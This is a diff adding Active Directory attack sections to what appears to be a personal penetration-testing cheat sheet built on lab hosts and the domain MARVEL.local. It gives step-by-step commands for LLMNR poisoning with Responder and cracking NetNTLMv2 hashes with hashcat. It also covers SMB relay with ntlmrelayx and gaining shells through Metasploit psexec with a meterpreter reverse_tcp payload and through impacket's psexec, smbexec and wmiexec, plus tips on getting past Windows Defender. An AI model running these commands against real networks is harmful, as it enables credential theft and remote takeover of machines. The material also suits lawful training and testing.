@@ -258,6 +258,36 @@ es-shortlist.txt```
 trator```
 > 3. Using crackmap exec to bruteforce a user password ```crackmapexec smb 192.168.10.39 -u administrator -d controller.local -p /usr/share/wordlists/rockyou.txt```
 
+#### LLMNR Poisoning - Active Directory 
+> 1. On Kali Linux ```responder -I eth0 -rdwv```
+> 1. On Victim Machine give ```\\<KALI-LINUX IP```
+> 1. Now, note down the hashes capured on Kali
+> 1. Use hashid to identify the hash algo ```hashid -m '<HASH VALUE>'```
+> 1. Answer can be ```[+] NetNTLMv2 [Hashcat Mode: 5600]```
+> 1. Crack it via HASHCAT ```hashcat.exe -a 0 -m 5600 005_fcastleLLNMR.txt 000_dict_rockyou.txt```
+					    
+#### SMB Relay - Active Directory 
+> 1. Instead of cracking the hash we captured in **reponder**, we can instead relay those hashes to specific machines and gain access.
+> 1. To work this requires **SMB signing must be DISABLED on the TARGET** and **Relayed user credentials must be admin on the machine**.
+> 1. Edit ```vim /etc/responder/Responder.conf```
+> 1. ```ntlmrelayx.py -tf targets.txt --smb2support```
+> 1. Who has SMB singing enabled and who has signing disabled ?
+> 1. ```nmap --script=smb2-security-mode.nse -p 445 192.168.10.0/24```
+> 1. On "AD" **Message signing enabled and required** however on "Machine" **Message signing enabled but not required**
+	
+#### Gaining Shell via SMB - Works for both Windows & Active Directory 
+##### via MSF
+> 1. use exploit/windows/smb/psexec
+> 1. set "SMBDomain", "SMBUser", "SMBPass"
+> 1. use correct payload i.e. ```windows/x64/meterpreter/reverse_tcp```
+> 1. This may fail as "Windows Defender" stops this, disabling Windows Defender gives us shell.
+##### Other tools
+> 1. ```psexec.py MARVEL.local/fcastle:Password1@192.168.10.25``` **[works with defender ON]**
+> 1. ```smbexec.py MARVEL.local/fcastle:Password1@192.168.10.25``` **[doesnt works with defender ON]**
+> 1. ```wmiexec.py MARVEL.local/fcastle:Password1@192.168.10.25``` **[doesnt works with defender ON]**	
+
+	
+					    
 	
 #### Misc. 	
 ##### Ubuntu WSL2 on Windows 10 - SSH portforwarding to access it via Public IP
